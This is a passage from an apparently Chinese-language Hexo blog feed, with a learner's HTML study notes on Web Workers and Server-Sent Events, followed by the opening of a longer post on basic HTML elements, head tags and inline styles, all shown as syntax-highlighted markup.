<code>undefined</code>，则又可以复用代码啦！</p><p>HTML中的完整代码如下。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Count numbers: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>output</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>result<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>output</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>startWorker()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Start Worker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stopWorker()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Stop Worker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">var</span> w<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">startWorker</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>Worker<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            w <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">"demo_workers.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        w<span class="token punctuation">.</span>onmessage <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> event<span class="token punctuation">.</span>data<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"Sorry! No Web Worker support."</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">stopWorker</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     w<span class="token punctuation">.</span><span class="token function">terminate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    w <span class="token operator">=</span> undefined<span class="token punctuation">;</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><br><hr><h2 id="Server-Sent-事件"><a href="#Server-Sent-事件" class="headerlink" title="Server-Sent 事件"></a>Server-Sent 事件</h2><p>Server-Sent 事件<em>（SSE）</em>指的是网页自动从服务器获得更新。</p><p><strong>EventSource 对象用于接收服务器发送事件通知。</strong></p><p>它有这几种方法：</p><table><thead><tr><th>事件</th><th>描述</th></tr></thead><tbody><tr><td>onopen</td><td>当通往服务器的连接被打开</td></tr><tr><td>onmessage</td><td>当接收到消息</td></tr><tr><td>onerror</td><td>当发生错误</td></tr></tbody></table><p>最常用的就 <code>onmessage</code> 方法。</p><pre class=" language-JavaScript"><code class="language-JavaScript">var source = new EventSource("demo_sse.php");source.onmessage = function(event) {    document.getElementById("result").innerHTML += event.data + "<br>";};</code></pre><p>这里创建了一个 EventSource 对象，然后规定发送更新的页面的 URL（”demo_sse.php”）。</p><p>每当接收到一次更新，就会发生 onmessage 事件，把已接收的数据推入 id 为 “result” 的元素中。</p><p>最好再加一个判断，看看浏览器是否支持SSE。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>result<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>EventSource<span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">"undefined"</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">var</span> source<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">EventSource</span><span class="token punctuation">(</span><span class="token string">"/example/html5/demo_sse.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        source<span class="token punctuation">.</span>onmessage<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">+</span><span class="token operator">=</span>event<span class="token punctuation">.</span>data <span class="token operator">+</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"抱歉，您的浏览器不支持 server-sent 事件 ..."</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>服务器端的话，把 <code>"Content-Type"</code> 报头设置为 <code>"text/event-stream"</code>，就可以开始发送事件流了。</p><br><br><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>HTML 的部分大概就告一段落了，如果要具体学的话，要想搞清楚每个属性的含义就感觉在看文档了，感觉没有必要。</p><p>还不如之后有不理解的再回来翻一翻，更狭义的知识点直接查文档就好了呀！</p><p>接下来就慢慢看看 CSS 和 JavaScript好了。</p><p>溜了溜了。</p><p><small><em>（这个寒假出不了门好难受啊嘤嘤嘤</em> </small></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> FrontEnd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FrontEnd </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FrontEnd | HTML 基础入门学习笔记</title>
      <link href="/2020/02/14/FrontEnd_HTML_Basic/"/>
      <url>/2020/02/14/FrontEnd_HTML_Basic/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近想<strong>系统一点学一学前端</strong>，这一篇博客就简要记录一些前端中 <strong>HTML 基础入门</strong>的学习笔记吧。</p><p>看完了小甲鱼目前更新了的web开发入门的视频，讲的还是挺不错的，总体来说还算比较系统的，而且<em>疑车有据</em>23333。</p><p>不过感觉不够全面，于是再来刷了一遍 W3School。</p><p>后面忘了还可以再来看看，或者再查文档就完事了。😂</p><p>其实就是简单过一遍23333 <em>类似于抄一遍（x</em></p><p><strong>这篇文章超长长长长长长长长……</strong> 所以先做好准备。</p><p>由于我的博客自带了一些CSS样式，<strong>显示的效果可能和预计的不同，最好还是建一个新的HTML文件来试试</strong>吧。</p><br><h3 id="一些参考的网站"><a href="#一些参考的网站" class="headerlink" title="一些参考的网站"></a>一些参考的网站</h3><p><a href="https://www.w3school.com.cn/html/index.asp" target="_blank" rel="noopener">W3School HTML 教程</a></p><p><a href="https://man.ilovefishc.com/html5/" target="_blank" rel="noopener">速查宝典：HTML5 API速查（鱼C工作室）</a></p><p><a href="https://www.runoob.com/html/html-tutorial.html" target="_blank" rel="noopener">HTML 菜鸟教程</a></p><p>B站视频 <em>（小甲鱼的视频居然还没更新完，催更一波</em></p><br><h2 id="整体框架"><a href="#整体框架" class="headerlink" title="整体框架"></a>整体框架</h2><p>HTML5</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>在VS Code中可以直接输入<code>html:5</code>，按下<code>Tab</code>键即可自动输入模板。用的是 <strong>Emmet Abbreviation</strong>。</p><br><hr><p>下面主要参考 <strong>W3School</strong> 的教程。更详细的请参考<a href="https://www.w3school.com.cn" target="_blank" rel="noopener">官网</a>。</p><h2 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h2><p><strong>HTML 文档是由 HTML 元素定义的。</strong></p><p>元素指的是从<strong>开始标签（start tag）</strong> <em>or开放标签（opening tag）</em> 到<strong>结束标签（end tag）</strong> <em>or闭合标签（closing tag）</em> 的所有代码。</p><p>空元素<strong>在开始标签中进行关闭</strong>（以开始标签的结束而结束），如<code>&lt;br /&gt;</code>。虽然写成<code>&lt;br&gt;</code>也行，但建议都关闭。</p><p>HTML 标签对大小写不敏感：<code>&lt;P&gt;</code> 等同于<code>&lt;p&gt;</code>。但是推荐/强制使用<strong>小写字母</strong>。</p><br><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p><strong>属性为 HTML 元素提供附加信息。</strong></p><p>属性总是以名称/值对的形式出现，比如：<em>name=”value”</em>。总是在 HTML 元素的<strong>开始标签</strong>中规定。</p><p>属性和属性值对大小写<strong>不敏感</strong>。但推荐使用<strong>小写</strong>。</p><p>属性值要包含在引号内，双引号、单引号均可。若属性值本身就含有双引号，那么必须使用单引号↓。</p><pre><code>name='Bill "HelloWorld" Gates'</code></pre><p>常用的 HTML 属性：</p><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>class</td><td><em>classname</em></td><td>规定元素的类名（classname）</td></tr><tr><td>id</td><td><em>id</em></td><td>规定元素的唯一 id</td></tr><tr><td>style</td><td><em>style_definition</em></td><td>规定元素的行内样式（inline style）</td></tr><tr><td>title</td><td><em>text</em></td><td>规定元素的额外信息（可在工具提示中显示）</td></tr></tbody></table><br><h2 id="头部-head"><a href="#头部-head" class="headerlink" title="头部 head"></a>头部 head</h2><p><code>head</code>元素中可以包含<code>&lt;title&gt;</code>、<code>&lt;base&gt;</code>、<code>&lt;link&gt;</code>、<code>&lt;meta&gt;</code>、<code>&lt;script&gt;</code> 以及 <code>&lt;style&gt;</code>。</p><h3 id="title-元素"><a href="#title-元素" class="headerlink" title="title 元素"></a>title 元素</h3><p><code>&lt;title&gt;</code> 标签定义文档的标题。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title of the document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></code></pre><h3 id="base-元素"><a href="#base-元素" class="headerlink" title="base 元素"></a>base 元素</h3><p><code>&lt;base&gt;</code> 标签为页面上的所有链接规定默认地址或默认目标（target）：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://miaotony.xyz/<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></code></pre><h3 id="link-元素"><a href="#link-元素" class="headerlink" title="link 元素"></a>link 元素</h3><p>定义文档与外部资源之间的关系。如样式表等。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mystyle.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></code></pre><h3 id="style-元素"><a href="#style-元素" class="headerlink" title="style 元素"></a>style 元素</h3><p><code>&lt;style&gt;</code> 标签用于为 HTML 文档定义样式信息。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style language-css">        <span class="token selector">body </span><span class="token punctuation">{</span><span class="token property">background-color</span><span class="token punctuation">:</span>yellow<span class="token punctuation">}</span>        <span class="token selector">p </span><span class="token punctuation">{</span><span class="token property">color</span><span class="token punctuation">:</span>blue<span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></code></pre><h3 id="meta-元素"><a href="#meta-元素" class="headerlink" title="meta 元素"></a>meta 元素</h3><p>元数据（metadata）是关于数据的信息。</p><p><code>&lt;meta&gt;</code> 标签提供关于 HTML 文档的元数据。元数据不会显示在页面上，但是对于机器是可读的。</p><p>典型的情况是，meta 元素被用于规定页面的描述、关键词、文档的作者、最后修改时间以及其他元数据。</p><p><code>&lt;meta&gt;</code> 标签始终位于 head 元素中。</p><p>元数据可用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他 web 服务。</p><h4 id="指定-UTF-8-编码"><a href="#指定-UTF-8-编码" class="headerlink" title="指定 UTF-8 编码"></a>指定 UTF-8 编码</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><h4 id="网页尺寸自适应"><a href="#网页尺寸自适应" class="headerlink" title="网页尺寸自适应"></a>网页尺寸自适应</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><h4 id="一些SEO关键词优化"><a href="#一些SEO关键词优化" class="headerlink" title="一些SEO关键词优化"></a>一些SEO关键词优化</h4><p>关键词，描述，作者等。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>keywords<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>MiaoTony, HTML, test<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>MiaoTony<span class="token punctuation">'</span>s HTML test.<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>author<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>MiaoTony<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><h4 id="自动刷新跳转页面-重定向页面"><a href="#自动刷新跳转页面-重定向页面" class="headerlink" title="自动刷新跳转页面 / 重定向页面"></a>自动刷新跳转页面 / 重定向页面</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>refresh<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0; https://miaotony.xyz<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><p>0s后自动跳转。</p><br><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><p>标题（Heading）是通过 <code>&lt;h1&gt;</code> - <code>&lt;h6&gt;</code>定义，从大到小。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>This is heading 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>This is heading 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>This is heading 3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span><span class="token punctuation">></span></span>This is heading 4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span><span class="token punctuation">></span></span>This is heading 5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h6</span><span class="token punctuation">></span></span>This is heading 6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h6</span><span class="token punctuation">></span></span></code></pre><blockquote><p>请仅仅把标题标签用于标题文本。不要仅仅为了产生粗体文本而使用它们。请使用其它标签或 CSS 代替。</p></blockquote><br><h2 id="水平线"><a href="#水平线" class="headerlink" title="水平线"></a>水平线</h2><p><code>&lt;hr /&gt;</code>标签用于定义水平线。如↓。</p><hr><br><h2 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h2><p> <code>&lt;p&gt;</code> 标签</p><p>浏览器会自动地在段落的前后添加空行。（<code>&lt;p&gt;</code> 是块级元素）</p><p>插入空行可以利用 <code>&lt;br /&gt;</code>，不要用 <code>p</code> 标签。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>这是段落<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p>这是段落</p><hr><p>在不产生一个新段落的情况下进行换行（新行），使用 <code>&lt;br /&gt;</code>，比如：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>This is<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>a para<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>graph with line breaks<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p>This is<br>a para<br>graph with line breaks</p>---<p>显示页面时，浏览器会移除<em>源代码中</em>多余的空格和空行。<strong>所有连续的空格或空行都会被算作一个空格。</strong></p><p>需要注意的是，<strong>HTML 代码中的所有连续的空行（换行）也被显示为一个空格。</strong>比如：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>    春眠不觉晓，      处处闻啼鸟。        夜来风雨声，          花落知多少。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p>    春眠不觉晓，      处处闻啼鸟。        夜来风雨声，          花落知多少。</p><br><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- This is a comment --></span></code></pre><h3 id="条件注释"><a href="#条件注释" class="headerlink" title="条件注释"></a>条件注释</h3><p>条件注释定义只有 Internet Explorer 执行的 HTML 标签。</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--[if lt IE 9]>  &lt;script src="http://html5shiv.googlecode.com/svn/trunk/html5.js">&lt;/script>&lt;![endif]--></span></code></pre><br><h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2><p><code>&lt;style&gt;</code> 标签用于为 HTML 文档定义样式信息。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font-family</span><span class="token punctuation">:</span>verdana<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>red</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>This text is in Verdana and red<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font-family</span><span class="token punctuation">:</span>times<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>green</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>This text is in Times and green<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font-size</span><span class="token punctuation">:</span><span class="token number">30</span>px</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>This text is 30 pixels high<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p style="font-family:verdana;color:red">This text is in Verdana and red</p><p style="font-family:times;color:green">This text is in Times and green</p><p style="font-size:30px">This text is 30 pixels high</p>下面是一些实例，更多关于样式的需要看 **CSS教程** 来着（（<h3 id="背景颜色"><a href="#背景颜色" class="headerlink" title="背景颜色"></a>背景颜色</h3><p><em><code>bgcolor</code> 属性已经弃用了</em>，要用<code>background-color</code>。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">background-color</span><span class="token punctuation">:</span>blue</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>This is a paragraph.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p style="background-color:blue">This is a paragraph.</p>  <br><h3 id="字体、颜色和尺寸"><a href="#字体、颜色和尺寸" class="headerlink" title="字体、颜色和尺寸"></a>字体、颜色和尺寸</h3><p>style 属性淘汰了旧的 <code>&lt;font&gt;</code> 标签。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span><span class="token number">25</span>px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>A paragraph.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p style="font-family:arial;color:red;font-size:25px;">A paragraph.</p><br><h3 id="文本对齐"><a href="#文本对齐" class="headerlink" title="文本对齐"></a>文本对齐</h3><p>使用<code>text-align</code>属性</p><p>style 属性淘汰了旧的 <code>align</code> 属性。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-align</span><span class="token punctuation">:</span>left</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>靠左对齐<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-align</span><span class="token punctuation">:</span>center</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>居中对齐<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token 